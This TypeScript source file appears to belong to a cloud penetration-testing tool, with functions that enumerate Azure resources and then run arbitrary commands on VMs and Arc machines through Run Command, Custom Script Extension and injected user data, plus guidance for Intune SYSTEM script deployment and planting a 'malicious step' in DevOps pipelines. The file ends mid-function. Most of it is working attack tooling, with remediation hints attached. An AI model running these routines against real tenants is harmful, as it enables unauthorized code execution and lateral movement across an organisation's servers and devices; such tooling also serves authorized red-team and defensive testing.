import { az, run, argVal, hasFlag, tryJson } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function vmRunCommand(args: string[], timeout: number): Promise<HookResult> {
  const sub = argVal(args, "--subscription-id")
  const vm = argVal(args, "--vm-name")
  const rg = argVal(args, "--resource-group")
  const cmd = argVal(args, "--command")
  const os = argVal(args, "--os") || "linux"
  const method = argVal(args, "--method") || "list"
  const findings: Finding[] = []
  const output: string[] = ["[*] Azure VM Run Command — management plane command execution...\n"]

  if (method === "list") {
    const rgArgs = rg ? ["--resource-group", rg] : []
    const vms = await az(
      [
        "vm",
        "list",
        ...rgArgs,
        "--query",
        "[].{name:name,rg:resourceGroup,os:storageProfile.osDisk.osType,state:provisioningState}",
      ],
      sub,
      timeout,
    )
    if (vms.exitCode !== 0)
      return { output: output.join("\n") + `[-] Failed to list VMs: ${vms.stderr.slice(0, 200)}`, findings }
    const vmList = tryJson(vms.stdout) || []
    output.push(`[+] VMs accessible for Run Command: ${vmList.length}`)
    for (const v of vmList) {
      output.push(`    ${v.name} (${v.rg}) — ${v.os} [${v.state}]`)
      findings.push({
        checkId: "AZ-RUNCMD-001",
        provider: "azure",
        severity: "high",
        status: "INFO",
        resource: `vm://${v.name}`,
        title: `VM accessible via Run Command: ${v.name}`,
        details: `OS: ${v.os}, RG: ${v.rg}. No SSH/RDP needed — uses Azure management plane.`,
        remediation: "Restrict Microsoft.Compute/virtualMachines/runCommands/write permission",
      })
    }
    output.push("\n[*] Use --method exec --vm-name NAME --resource-group RG --command CMD to execute")
    return { output: output.join("\n"), findings }
  }

  if (!vm || !rg || !cmd)
    return { output: "[-] --vm-name, --resource-group, and --command required for exec", findings }

  const commandId = os === "windows" ? "RunPowerShellScript" : "RunShellScript"
  output.push(`[*] Executing on ${vm} via ${commandId}...`)
  output.push(`    Command: ${cmd}`)

  const exec = await az(
    ["vm", "run-command", "invoke", "--command-id", commandId, "--name", vm, "--resource-group", rg, "--scripts", cmd],
    sub,
    timeout,
  )

  if (exec.exitCode === 0) {
    const result = tryJson(exec.stdout)
    const stdoutMsg = result?.value?.[0]?.message || ""
    const stderrMsg = result?.value?.[1]?.message || ""
    output.push(`\n[+] Execution successful`)
    if (stdoutMsg) output.push(`[stdout]\n${stdoutMsg}`)
    if (stderrMsg) output.push(`[stderr]\n${stderrMsg}`)
    findings.push({
      checkId: "AZ-RUNCMD-002",
      provider: "azure",
      severity: "critical",
      status: "EXPLOITED",
      resource: `vm://${vm}`,
      title: `Command executed on ${vm} via Run Command API`,
      details: `${commandId}: ${cmd.slice(0, 100)}`,
      remediation: "Review Activity Log for RunCommand operations, restrict RBAC",
    })
  }
  if (exec.exitCode !== 0) {
    output.push(`[-] Execution failed: ${exec.stderr.slice(0, 300)}`)
  }

  return { output: output.join("\n"), findings }
}

export async function bastionTunnel(args: string[], timeout: number): Promise<HookResult> {
  const sub = argVal(args, "--subscription-id")
  const rg = argVal(args, "--resource-group")
  const bastionName = argVal(args, "--bastion-name")
  const targetVm = argVal(args, "--target-vm")
  const targetRg = argVal(args, "--target-resource-group")
  const method = argVal(args, "--method") || "list"
  const findings: Finding[] = []
  const output: string[] = ["[*] Azure Bastion tunnel enumeration...\n"]

  if (method === "list") {
    const bastions = await az(["network", "bastion", "list"], sub, timeout)
    if (bastions.exitCode !== 0) {
      output.push(`[-] Failed to list Bastion hosts: ${bastions.stderr.slice(0, 200)}`)
      return { output: output.join("\n"), findings }
    }
    const bastionList = tryJson(bastions.stdout) || []
    output.push(`[+] Bastion hosts: ${bastionList.length}`)
    for (const b of bastionList) {
      output.push(`    ${b.name} (${b.resourceGroup})`)
      output.push(`      SKU: ${b.sku?.name || "unknown"}`)
      output.push(`      DNS: ${b.dnsName || "N/A"}`)
      output.push(`      Tunneling: ${b.enableTunneling ? "ENABLED" : "disabled"}`)
      output.push(`      IP connect: ${b.enableIpConnect ? "ENABLED" : "disabled"}`)
      output.push(`      Shareable link: ${b.enableShareableLink ? "ENABLED" : "disabled"}`)

      const vnetId = b.ipConfigurations?.[0]?.subnet?.id
      if (vnetId) {
        const vnetName = vnetId.split("/virtualNetworks/")[1]?.split("/")[0]
        const vnetRg = vnetId.split("/resourceGroups/")[1]?.split("/")[0]
        output.push(`      VNet: ${vnetName} (${vnetRg})`)
      }

      if (b.enableTunneling) {
        findings.push({
          checkId: "AZ-BASTION-001",
          provider: "azure",
          severity: "high",
          status: "FAIL",
          resource: `bastion://${b.name}`,
          title: `Bastion with tunneling enabled: ${b.name}`,
          details: `Tunneling allows SSH/RDP to any VM in the VNet without public IPs. DNS: ${b.dnsName || "N/A"}`,
          remediation: "Restrict Bastion RBAC, disable tunneling if not needed",
        })
      }
    }

    const rgFilter = rg ? ["--resource-group", rg] : []
    const vms = await az(["vm", "list", ...rgFilter, "--query", "[].{name:name,rg:resourceGroup,id:id}"], sub, timeout)
    if (vms.exitCode === 0) {
      const vmList = tryJson(vms.stdout) || []
      output.push(`\n[+] VMs reachable via Bastion: ${vmList.length}`)
      for (const v of vmList) {
        output.push(`    ${v.name} (${v.rg})`)
      }
    }
    return { output: output.join("\n"), findings }
  }

  if (!bastionName || !targetVm) return { output: "[-] --bastion-name and --target-vm required for tunnel", findings }

  const tRg = targetRg || rg
  if (!tRg) return { output: "[-] --resource-group or --target-resource-group required", findings }

  const vmInfo = await az(
    ["vm", "show", "--name", targetVm, "--resource-group", tRg, "--query", "id", "-o", "tsv"],
    sub,
    timeout,
  )
  if (vmInfo.exitCode !== 0)
    return { output: output.join("\n") + `[-] VM not found: ${vmInfo.stderr.slice(0, 200)}`, findings }

  const vmId = vmInfo.stdout.trim()
  output.push(`[*] Bastion: ${bastionName}`)
  output.push(`[*] Target VM: ${targetVm} (${tRg})`)
  output.push(`[*] VM ID: ${vmId}`)
  output.push(`\n[+] SSH tunnel command:`)
  output.push(
    `    az network bastion ssh --name ${bastionName} --resource-group ${rg || tRg} --target-resource-id ${vmId} --auth-type ssh-key --ssh-key ~/.ssh/id_rsa`,
  )
  output.push(`\n[+] RDP tunnel command:`)
  output.push(
    `    az network bastion rdp --name ${bastionName} --resource-group ${rg || tRg} --target-resource-id ${vmId}`,
  )
  output.push(`\n[+] Port forwarding (native tunnel):`)
  output.push(
    `    az network bastion tunnel --name ${bastionName} --resource-group ${rg || tRg} --target-resource-id ${vmId} --resource-port 22 --port 2222`,
  )

  findings.push({
    checkId: "AZ-BASTION-002",
    provider: "azure",
    severity: "critical",
    status: "READY",
    resource: `bastion://${bastionName}/vm/${targetVm}`,
    title: `Bastion tunnel ready to ${targetVm} via ${bastionName}`,
    details: `VM in private VNet accessible through Azure management plane — no public IP needed`,
    remediation: "Review Bastion access logs, restrict RBAC on Bastion host",
  })

  return { output: output.join("\n"), findings }
}

export async function arcExec(args: string[], timeout: number): Promise<HookResult> {
  const sub = argVal(args, "--subscription-id")
  const rg = argVal(args, "--resource-group")
  const machine = argVal(args, "--machine")
  const cmd = argVal(args, "--command")
  const method = argVal(args, "--method") || "list"
  const findings: Finding[] = []
  const output: string[] = ["[*] Azure Arc connected machine enumeration...\n"]

  if (method === "list") {
    const machines = await az(["connectedmachine", "list"], sub, timeout)
    if (machines.exitCode !== 0) {
      const err = machines.stderr.trim()
      if (err.includes("not found") || err.includes("connectedmachine")) {
        output.push("[-] connectedmachine CLI extension not available or no Arc machines")
        output.push("[*] Install: az extension add --name connectedmachine")
      }
      if (!err.includes("not found") && !err.includes("connectedmachine")) {
        output.push(`[-] Failed: ${err.slice(0, 200)}`)
      }
      return { output: output.join("\n"), findings }
    }
    const machineList = tryJson(machines.stdout) || []
    output.push(`[+] Arc-connected machines: ${machineList.length}`)
    for (const m of machineList) {
      output.push(`    ${m.name} (${m.resourceGroup})`)
      output.push(`      OS: ${m.osName || m.osSku || "unknown"} ${m.osVersion || ""}`)
      output.push(`      Status: ${m.status}`)
      output.push(`      Agent: ${m.agentVersion || "unknown"}`)
      output.push(`      Last seen: ${m.lastStatusChange || "unknown"}`)
      if (m.identity?.principalId) output.push(`      Identity: ${m.identity.principalId}`)

      if (m.status === "Connected") {
        findings.push({
          checkId: "AZ-ARC-001",
          provider: "azure",
          severity: "high",
          status: "INFO",
          resource: `arc://${m.name}`,
          title: `Arc machine connected: ${m.name}`,
          details: `${m.osName || "unknown"} — on-prem/multi-cloud server managed via Azure. Run Command available.`,
          remediation: "Review Arc RBAC, restrict run command permissions",
        })
      }
    }

    const extensions = await az(
      [
        "connectedmachine",
        "extension",
        "list",
        "--machine-name",
        machineList[0]?.name || "none",
        "--resource-group",
        machineList[0]?.resourceGroup || "none",
      ],
      sub,
      timeout,
    )
    if (extensions.exitCode === 0) {
      const extList = tryJson(extensions.stdout) || []
      output.push(`\n[+] Extensions on first machine: ${extList.length}`)
      for (const e of extList) output.push(`    ${e.name} (${e.type}) — ${e.provisioningState}`)
    }
    return { output: output.join("\n"), findings }
  }

  if (!machine || !rg || !cmd)
    return { output: "[-] --machine, --resource-group, and --command required for exec", findings }

  output.push(`[*] Executing on Arc machine: ${machine}`)
  output.push(`    Command: ${cmd}`)

  const exec = await az(
    [
      "connectedmachine",
      "run-command",
      "create",
      "--machine-name",
      machine,
      "--resource-group",
      rg,
      "--run-command-name",
      `cs-cmd-${Date.now().toString(36)}`,
      "--script",
      cmd,
    ],
    sub,
    timeout,
  )

  if (exec.exitCode === 0) {
    const result = tryJson(exec.stdout)
    output.push(`[+] Command executed on Arc machine`)
    if (result?.instanceView?.output) output.push(`[output]\n${result.instanceView.output}`)
    if (result?.instanceView?.error) output.push(`[error]\n${result.instanceView.error}`)
    findings.push({
      checkId: "AZ-ARC-002",
      provider: "azure",
      severity: "critical",
      status: "EXPLOITED",
      resource: `arc://${machine}`,
      title: `Command executed on Arc machine: ${machine}`,
      details: `On-premises server compromised via Azure management plane: ${cmd.slice(0, 100)}`,
      remediation: "Review Arc Activity Log, restrict connectedMachine/runCommands permission",
    })
  }
  if (exec.exitCode !== 0) {
    output.push(`[-] Execution failed: ${exec.stderr.slice(0, 300)}`)
    output.push("[*] Alternative: deploy CustomScriptExtension via az connectedmachine extension create")
  }

  return { output: output.join("\n"), findings }
}

export async function devopsServiceConn(args: string[], timeout: number): Promise<HookResult> {
  const org = argVal(args, "--org")
  const project = argVal(args, "--project")
  const findings: Finding[] = []
  const output: string[] = ["[*] Azure DevOps service connection enumeration...\n"]

  const extCheck = await run("az", ["extension", "show", "--name", "azure-devops"], timeout)
  if (extCheck.exitCode !== 0) {
    const install = await run("az", ["extension", "add", "--name", "azure-devops", "--yes"], timeout)
    if (install.exitCode !== 0) {
      output.push(`[-] Failed to install azure-devops extension: ${install.stderr.slice(0, 200)}`)
      return { output: output.join("\n"), findings }
    }
  }

  const orgArgs = org ? ["--org", org] : []

  if (!project) {
    const projects = await run("az", ["devops", "project", "list", ...orgArgs, "-o", "json"], timeout)
    if (projects.exitCode !== 0) {
      output.push(`[-] Failed to list projects: ${projects.stderr.slice(0, 200)}`)
      return { output: output.join("\n"), findings }
    }
    const projectList = tryJson(projects.stdout)?.value || []
    output.push(`[+] Projects: ${projectList.length}`)

    for (const p of projectList) {
      output.push(`\n[*] Project: ${p.name}`)
      const endpoints = await run(
        "az",
        ["devops", "service-endpoint", "list", "--project", p.name, ...orgArgs, "-o", "json"],
        timeout,
      )
      if (endpoints.exitCode !== 0) continue
      const epList = tryJson(endpoints.stdout) || []
      output.push(`    Service connections: ${epList.length}`)

      for (const ep of epList) {
        output.push(`    ${ep.name} — ${ep.type} (${ep.isShared ? "shared" : "project-scoped"})`)
        output.push(`      Created by: ${ep.createdBy?.displayName || "unknown"}`)
        output.push(`      Authorized: ${ep.isReady ? "yes" : "no"}`)

        if (ep.type === "azurerm") {
          const data = ep.data || {}
          output.push(`      Subscription: ${data.subscriptionName || data.subscriptionId || "N/A"}`)
          output.push(`      Scope: ${data.scopeLevel || "N/A"}`)
          findings.push({
            checkId: "AZ-SVCCONN-001",
            provider: "azure",
            severity: "high",
            status: "FAIL",
            resource: `devops://${p.name}/svcconn/${ep.name}`,
            title: `Azure RM service connection: ${ep.name}`,
            details: `Type: ${ep.type}, sub: ${data.subscriptionName || data.subscriptionId || "?"}, scope: ${data.scopeLevel || "?"}. Pivot to Azure subscription.`,
            remediation: "Review service connection permissions and scope, require approval for use",
          })
        }

        if (ep.type === "kubernetes") {
          findings.push({
            checkId: "AZ-SVCCONN-002",
            provider: "azure",
            severity: "high",
            status: "FAIL",
            resource: `devops://${p.name}/svcconn/${ep.name}`,
            title: `Kubernetes service connection: ${ep.name}`,
            details: `Connects to K8s cluster — potential pivot to container infrastructure`,
            remediation: "Restrict K8s service connection to specific namespaces",
          })
        }

        if (ep.type === "dockerregistry") {
          findings.push({
            checkId: "AZ-SVCCONN-003",
            provider: "azure",
            severity: "medium",
            status: "FAIL",
            resource: `devops://${p.name}/svcconn/${ep.name}`,
            title: `Docker registry service connection: ${ep.name}`,
            details: `Container registry access — can push malicious images`,
            remediation: "Restrict registry permissions to pull-only where possible",
          })
        }
      }
    }
    return { output: output.join("\n"), findings }
  }

  const endpoints = await run(
    "az",
    ["devops", "service-endpoint", "list", "--project", project, ...orgArgs, "-o", "json"],
    timeout,
  )
  if (endpoints.exitCode !== 0) {
    output.push(`[-] Failed: ${endpoints.stderr.slice(0, 200)}`)
    return { output: output.join("\n"), findings }
  }
  const epList = tryJson(endpoints.stdout) || []
  output.push(`[+] Service connections in ${project}: ${epList.length}`)
  for (const ep of epList) {
    output.push(`    ${ep.name} — ${ep.type}`)
    output.push(`      Created: ${ep.createdBy?.displayName || "unknown"}`)
    output.push(`      Ready: ${ep.isReady}, Shared: ${ep.isShared}`)
  }

  return { output: output.join("\n"), findings }
}

export async function crossTenantEnum(args: string[], timeout: number): Promise<HookResult> {
  const sub = argVal(args, "--subscription-id")
  const findings: Finding[] = []
  const output: string[] = ["[*] Cross-tenant access enumeration...\n"]

  const ctap = await run(
    "az",
    [
      "rest",
      "--method",
      "GET",
      "--url",
      "https://graph.microsoft.com/v1.0/policies/crossTenantAccessPolicy",
      "-o",
      "json",
    ],
    timeout,
  )
  if (ctap.exitCode === 0) {
    const policy = tryJson(ctap.stdout)
    if (policy) {
      output.push(`[+] Cross-tenant access policy:`)
      const def = policy.default || {}
      output.push(
        `    Inbound trust: MFA=${def.inboundTrust?.isMfaAccepted || false}, Device=${def.inboundTrust?.isCompliantDeviceAccepted || false}`,
      )
      output.push(
        `    B2B collaboration inbound: ${def.b2bCollaborationInbound?.usersAndGroups?.accessType || "default"}`,
      )
      output.push(
        `    B2B collaboration outbound: ${def.b2bCollaborationOutbound?.usersAndGroups?.accessType || "default"}`,
      )
    }
  }
  if (ctap.exitCode !== 0)
    output.push(`[-] Cross-tenant policy access denied (needs Policy.Read.All): ${ctap.stderr.slice(0, 200)}`)

  const partners = await run(
    "az",
    [
      "rest",
      "--method",
      "GET",
      "--url",
      "https://graph.microsoft.com/v1.0/policies/crossTenantAccessPolicy/partners",
      "-o",
      "json",
    ],
    timeout,
  )
  if (partners.exitCode === 0) {
    const partnerList = tryJson(partners.stdout)?.value || []
    output.push(`\n[+] Partner tenants: ${partnerList.length}`)
    for (const p of partnerList) {
      output.push(`    Tenant: ${p.tenantId}`)
      output.push(`      Inbound: ${p.b2bCollaborationInbound?.usersAndGroups?.accessType || "default"}`)
      output.push(`      Outbound: ${p.b2bCollaborationOutbound?.usersAndGroups?.accessType || "default"}`)
      output.push(`      Trust MFA: ${p.inboundTrust?.isMfaAccepted || false}`)
      findings.push({
        checkId: "AZ-XTENANT-001",
        provider: "azure",
        severity: "medium",
        status: "INFO",
        resource: `tenant://${p.tenantId}`,
        title: `Cross-tenant partner: ${p.tenantId}`,
        details: `B2B collaboration configured — potential lateral movement path`,
        remediation: "Review cross-tenant access policies, restrict to necessary tenants",
      })
    }
  }

  output.push(`\n[*] Enumerating guest users...`)
  const guests = await az(
    [
      "ad",
      "user",
      "list",
      "--filter",
      "userType eq 'Guest'",
      "--query",
      "[].{upn:userPrincipalName,display:displayName,created:createdDateTime}",
    ],
    undefined,
    timeout,
  )
  if (guests.exitCode === 0) {
    const guestList = tryJson(guests.stdout) || []
    output.push(`[+] Guest users: ${guestList.length}`)
    for (const g of guestList) {
      output.push(`    ${g.display} — ${g.upn}`)
      if (g.created) output.push(`      Created: ${g.created}`)
    }
    if (guestList.length > 0) {
      findings.push({
        checkId: "AZ-XTENANT-002",
        provider: "azure",
        severity: "medium",
        status: "INFO",
        resource: "tenant://guests",
        title: `${guestList.length} guest users in tenant`,
        details: "Guest users from external tenants — check their role assignments for excessive access",
        remediation: "Review guest user access, enable access reviews for guest accounts",
      })
    }
  }

  const b2bInvites = await az(
    [
      "ad",
      "user",
      "list",
      "--filter",
      "externalUserState eq 'PendingAcceptance'",
      "--query",
      "[].{upn:userPrincipalName,display:displayName}",
    ],
    undefined,
    timeout,
  )
  if (b2bInvites.exitCode === 0) {
    const pending = tryJson(b2bInvites.stdout) || []
    if (pending.length > 0) {
      output.push(`\n[+] Pending B2B invitations: ${pending.length}`)
      for (const p of pending) output.push(`    ${p.display} — ${p.upn}`)
      findings.push({
        checkId: "AZ-XTENANT-003",
        provider: "azure",
        severity: "low",
        status: "INFO",
        resource: "tenant://pending-invites",
        title: `${pending.length} pending B2B invitations`,
        details: "Unaccepted invitations could be intercepted if invitation emails are compromised",
        remediation: "Review and revoke stale pending invitations",
      })
    }
  }

  return { output: output.join("\n"), findings }
}

export async function customScriptExt(args: string[], timeout: number): Promise<HookResult> {
  const sub = argVal(args, "--subscription-id")
  const vm = argVal(args, "--vm-name")
  const rg = argVal(args, "--resource-group")
  const scriptUri = argVal(args, "--script-uri")
  const cmd = argVal(args, "--command")
  const os = argVal(args, "--os") || "linux"
  const method = argVal(args, "--method") || "list"
  const findings: Finding[] = []
  const output: string[] = ["[*] Azure Custom Script Extension lateral movement...\n"]

  if (method === "list") {
    const rgArgs = rg ? ["--resource-group", rg] : []
    const vms = await az(["vm", "list", ...rgArgs, "--query", "[].{name:name,rg:resourceGroup,os:storageProfile.osDisk.osType,state:provisioningState}"], sub, timeout)
    if (vms.exitCode !== 0) return { output: output.join("\n") + `[-] Failed: ${vms.stderr.slice(0, 200)}`, findings }
    const vmList = tryJson(vms.stdout) || []
    output.push(`[+] VMs available for Custom Script Extension: ${vmList.length}`)
    for (const v of vmList) {
      output.push(`    ${v.name} (${v.rg}) — ${v.os} [${v.state}]`)
      const exts = await az(["vm", "extension", "list", "--vm-name", v.name, "--resource-group", v.rg, "--query", "[].{name:name,publisher:publisher,state:provisioningState}"], sub, timeout)
      if (exts.exitCode === 0) {
        const extList = tryJson(exts.stdout) || []
        for (const e of extList) output.push(`      ext: ${e.name} (${e.publisher}) — ${e.state}`)
      }
    }
    return { output: output.join("\n"), findings }
  }

  if (!vm || !rg) return { output: "[-] --vm-name and --resource-group required", findings }

  const publisher = os === "windows" ? "Microsoft.Compute" : "Microsoft.Azure.Extensions"
  const extName = os === "windows" ? "CustomScriptExtension" : "customScript"
  const settings = scriptUri
    ? JSON.stringify({ fileUris: [scriptUri], commandToExecute: cmd || (os === "windows" ? "powershell -ExecutionPolicy Bypass -File script.ps1" : "bash script.sh") })
    : JSON.stringify({ commandToExecute: cmd || "whoami && id && hostname" })

  output.push(`[*] Deploying Custom Script Extension to ${vm}...`)
  const deploy = await az(
    ["vm", "extension", "set", "--vm-name", vm, "--resource-group", rg, "--name", extName, "--publisher", publisher, "--settings", settings],
    sub,
    timeout,
  )

  if (deploy.exitCode === 0) {
    output.push(`[+] Custom Script Extension deployed — code executing on ${vm}`)
    findings.push({
      checkId: "AZ-CSE-001",
      provider: "azure",
      severity: "critical",
      status: "EXPLOITED",
      resource: `vm://${vm}/ext/${extName}`,
      title: `Custom Script Extension deployed on ${vm}`,
      details: `Lateral movement via management plane — no network access needed. ${scriptUri ? `Script: ${scriptUri}` : `Command: ${(cmd || "").slice(0, 80)}`}`,
      remediation: `Remove: az vm extension delete --vm-name ${vm} --resource-group ${rg} --name ${extName}`,
    })
  }
  if (deploy.exitCode !== 0) output.push(`[-] Deploy failed: ${deploy.stderr.slice(0, 300)}`)

  return { output: output.join("\n"), findings }
}

export async function userdataCommand(args: string[], timeout: number): Promise<HookResult> {
  const sub = argVal(args, "--subscription-id")
  const vm = argVal(args, "--vm-name")
  const rg = argVal(args, "--resource-group")
  const userData = argVal(args, "--user-data")
  const method = argVal(args, "--method") || "list"
  const findings: Finding[] = []
  const output: string[] = ["[*] Azure VM user data / custom data injection...\n"]

  if (method === "list") {
    const rgArgs = rg ? ["--resource-group", rg] : []
    const vms = await az(["vm", "list", ...rgArgs, "--query", "[].{name:name,rg:resourceGroup,os:storageProfile.osDisk.osType}"], sub, timeout)
    if (vms.exitCode !== 0) return { output: output.join("\n") + `[-] Failed: ${vms.stderr.slice(0, 200)}`, findings }
    const vmList = tryJson(vms.stdout) || []
    output.push(`[+] VMs: ${vmList.length}`)
    for (const v of vmList) {
      output.push(`    ${v.name} (${v.rg}) — ${v.os}`)
      const ud = await az(["vm", "show", "--name", v.name, "--resource-group", v.rg, "--query", "userData"], sub, timeout)
      if (ud.exitCode === 0 && ud.stdout.trim() && ud.stdout.trim() !== "null") {
        output.push(`      [!] Has existing user data`)
        findings.push({
          checkId: "AZ-UDATA-001",
          provider: "azure",
          severity: "medium",
          status: "INFO",
          resource: `vm://${v.name}`,
          title: `VM has user data configured: ${v.name}`,
          details: "User data may contain cloud-init scripts, secrets, or configuration",
          remediation: "Review VM user data for sensitive content",
        })
      }
    }
    return { output: output.join("\n"), findings }
  }

  if (!vm || !rg) return { output: "[-] --vm-name and --resource-group required", findings }

  const payload = userData || Buffer.from("#!/bin/bash\ncurl -s https://metadata.azure.com/metadata/instance?api-version=2021-02-01 -H 'Metadata:true'").toString("base64")

  output.push(`[*] Injecting user data into ${vm}...`)
  const update = await az(["vm", "update", "--name", vm, "--resource-group", rg, "--set", `userData=${payload}`], sub, timeout)

  if (update.exitCode === 0) {
    output.push(`[+] User data injected — will execute on next cloud-init run or reboot`)
    output.push(`[*] Access from inside VM: curl -H Metadata:true http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01`)
    findings.push({
      checkId: "AZ-UDATA-002",
      provider: "azure",
      severity: "high",
      status: "EXPLOITED",
      resource: `vm://${vm}`,
      title: `User data injected on ${vm}`,
      details: "Script will execute on cloud-init cycle. Useful for lateral movement without network.",
      remediation: `Clear: az vm update --name ${vm} --resource-group ${rg} --set userData=""`,
    })
  }
  if (update.exitCode !== 0) output.push(`[-] Failed: ${update.stderr.slice(0, 300)}`)

  return { output: output.join("\n"), findings }
}

export async function intuneDeploy(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "list"
  const findings: Finding[] = []
  const output: string[] = ["[*] Microsoft Intune device management enumeration...\n"]

  if (action === "list") {
    const devices = await run("az", ["rest", "--method", "GET", "--url", "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices?$top=50&$select=deviceName,operatingSystem,osVersion,managementAgent,complianceState,userPrincipalName,lastSyncDateTime", "-o", "json"], timeout)
    if (devices.exitCode === 0) {
      const list = tryJson(devices.stdout)?.value || []
      output.push(`[+] Intune managed devices: ${list.length}`)
      for (const d of list) {
        output.push(`    ${d.deviceName} — ${d.operatingSystem} ${d.osVersion || ""} (${d.managementAgent})`)
        output.push(`      User: ${d.userPrincipalName || "N/A"}, Compliance: ${d.complianceState}, Last sync: ${d.lastSyncDateTime || "unknown"}`)
      }
      if (list.length > 0) {
        findings.push({
          checkId: "AZ-INTUNE-001",
          provider: "azure",
          severity: "high",
          status: "ENUMERATED",
          resource: "intune://managed-devices",
          title: `${list.length} Intune managed devices found`,
          details: "Intune devices can be targeted with scripts/configs for lateral movement",
          remediation: "Review Intune device management RBAC permissions",
        })
      }
    }
    if (devices.exitCode !== 0) output.push(`[-] Cannot list Intune devices (needs DeviceManagementManagedDevices.Read.All): ${devices.stderr.slice(0, 200)}`)

    const scripts = await run("az", ["rest", "--method", "GET", "--url", "https://graph.microsoft.com/beta/deviceManagement/deviceManagementScripts?$select=displayName,description,runAsAccount,enforceSignatureCheck", "-o", "json"], timeout)
    if (scripts.exitCode === 0) {
      const scriptList = tryJson(scripts.stdout)?.value || []
      output.push(`\n[+] Intune PowerShell scripts: ${scriptList.length}`)
      for (const s of scriptList) output.push(`    ${s.displayName} — runAs: ${s.runAsAccount || "system"}, signatureCheck: ${s.enforceSignatureCheck || false}`)
    }

    const configs = await run("az", ["rest", "--method", "GET", "--url", "https://graph.microsoft.com/v1.0/deviceManagement/deviceConfigurations?$select=displayName,lastModifiedDateTime", "-o", "json"], timeout)
    if (configs.exitCode === 0) {
      const configList = tryJson(configs.stdout)?.value || []
      output.push(`\n[+] Device configuration profiles: ${configList.length}`)
      for (const c of configList) output.push(`    ${c.displayName} — modified: ${c.lastModifiedDateTime || "unknown"}`)
    }
  }

  if (action === "deploy_script") {
    output.push(`\n[!] Script deployment via Intune:`)
    output.push(`    POST https://graph.microsoft.com/beta/deviceManagement/deviceManagementScripts`)
    output.push(`    Body: { displayName, scriptContent (base64), runAsAccount: "system", enforceSignatureCheck: false }`)
    output.push(`    Then assign to device group for execution`)
    output.push(`\n[*] This runs as SYSTEM on all targeted devices — powerful lateral movement`)
    findings.push({
      checkId: "AZ-INTUNE-002",
      provider: "azure",
      severity: "critical",
      status: "READY",
      resource: "intune://script-deploy",
      title: "Intune script deployment ready",
      details: "Can deploy arbitrary PowerShell as SYSTEM to managed devices",
      remediation: "Review Intune RBAC, audit script deployments",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function msbuildExec(args: string[], timeout: number): Promise<HookResult> {
  const org = argVal(args, "--org")
  const project = argVal(args, "--project")
  const method = argVal(args, "--method") || "list"
  const findings: Finding[] = []
  const output: string[] = ["[*] Azure DevOps build agent lateral movement...\n"]

  const extCheck = await run("az", ["extension", "show", "--name", "azure-devops"], timeout)
  if (extCheck.exitCode !== 0) await run("az", ["extension", "add", "--name", "azure-devops", "--yes"], timeout)

  const orgArgs = org ? ["--org", org] : []

  if (method === "list") {
    const pools = await run("az", ["pipelines", "pool", "list", ...orgArgs, "-o", "json"], timeout)
    if (pools.exitCode === 0) {
      const poolList = tryJson(pools.stdout) || []
      output.push(`[+] Agent pools: ${poolList.length}`)
      for (const p of poolList) {
        output.push(`    ${p.name} (id:${p.id}) — size: ${p.size || 0}, isHosted: ${p.isHosted || false}`)
        if (!p.isHosted) {
          findings.push({
            checkId: "AZ-BUILD-001",
            provider: "azure",
            severity: "high",
            status: "INFO",
            resource: `devops://pool/${p.name}`,
            title: `Self-hosted agent pool: ${p.name}`,
            details: `${p.size || 0} agents — code executed here runs on org infrastructure`,
            remediation: "Review agent pool permissions and network access",
          })
        }
      }
    }
    if (pools.exitCode !== 0) output.push(`[-] Cannot list pools: ${pools.stderr.slice(0, 200)}`)

    if (project) {
      const agents = await run("az", ["pipelines", "agent", "list", "--pool-id", "1", ...orgArgs, "-o", "json"], timeout)
      if (agents.exitCode === 0) {
        const agentList = tryJson(agents.stdout) || []
        output.push(`\n[+] Agents in default pool: ${agentList.length}`)
        for (const a of agentList) output.push(`    ${a.name} — status: ${a.status}, os: ${a.osDescription || "unknown"}, version: ${a.version || "unknown"}`)
      }
    }
    return { output: output.join("\n"), findings }
  }

  if (!project) return { output: "[-] --project required for exec", findings }

  output.push(`[*] To execute code on build agents:`)
  output.push(`    1. Modify existing pipeline YAML to add malicious step`)
  output.push(`    2. Create new pipeline with inline script`)
  output.push(`    3. Queue build: az pipelines run --name PIPELINE --project ${project} ${orgArgs.join(" ")}`)
  output.push(`\n[*] Self-hosted agents often have access to internal networks, credentials, and source code`)
  findings.push({
    checkId: "AZ-BUILD-002",
    provider: "azure",
    severity: "critical",
    status: "READY",
    resource: `devops://${project}/build-agent`,
    title: `Build agent execution ready in ${project}`,
    details: "Pipeline execution provides code execution on build infrastructure",
    remediation: "Limit pipeline permissions, use isolated agents",
  })

  return { output: output.join("\n"), findings }
}

export async function sharedImageInject(args: string[], timeout: number): Promise<HookResult> {
  const sub = argVal(args, "--subscription-id")
  const rg = argVal(args, "--resource-group")
  const galleryName = argVal(args, "--gallery")
  const method = argVal(args, "--method") || "list"
  const findings: Finding[] = []
  const output: string[] = ["[*] Azure Shared Image Gallery / Compute Gallery enumeration...\n"]

  if (method === "list") {
    const galleries = await az(["sig", "list", "--query", "[].{name:name,rg:resourceGroup,location:location}"], sub, timeout)
    if (galleries.exitCode !== 0) return { output: output.join("\n") + `[-] Failed: ${galleries.stderr.slice(0, 200)}`, findings }
    const galList = tryJson(galleries.stdout) || []
    output.push(`[+] Compute Galleries: ${galList.length}`)
    for (const g of galList) {
      output.push(`    ${g.name} (${g.rg}) — ${g.location}`)
      const images = await az(["sig", "image-definition", "list", "--gallery-name", g.name, "--resource-group", g.rg, "--query", "[].{name:name,os:osType,state:provisioningState}"], sub, timeout)
      if (images.exitCode === 0) {
        const imgList = tryJson(images.stdout) || []
        for (const img of imgList) {
          output.push(`      image: ${img.name} (${img.os}) — ${img.state}`)
          findings.push({
            checkId: "AZ-SIG-001",
            provider: "azure",
            severity: "medium",
            status: "INFO",
            resource: `sig://${g.name}/${img.name}`,
            title: `Shared image: ${img.name} in ${g.name}`,
            details: `OS: ${img.os}. If writable, new versions can contain backdoored images used by VMSS/VM deployments.`,
            remediation: "Restrict write access to image galleries",
          })
        }
      }
    }
    return { output: output.join("\n"), findings }
  }

  if (!galleryName || !rg) return { output: "[-] --gallery and --resource-group required", findings }

  const images = await az(["sig", "image-definition", "list", "--gallery-name", galleryName, "--resource-group", rg], sub, timeout)
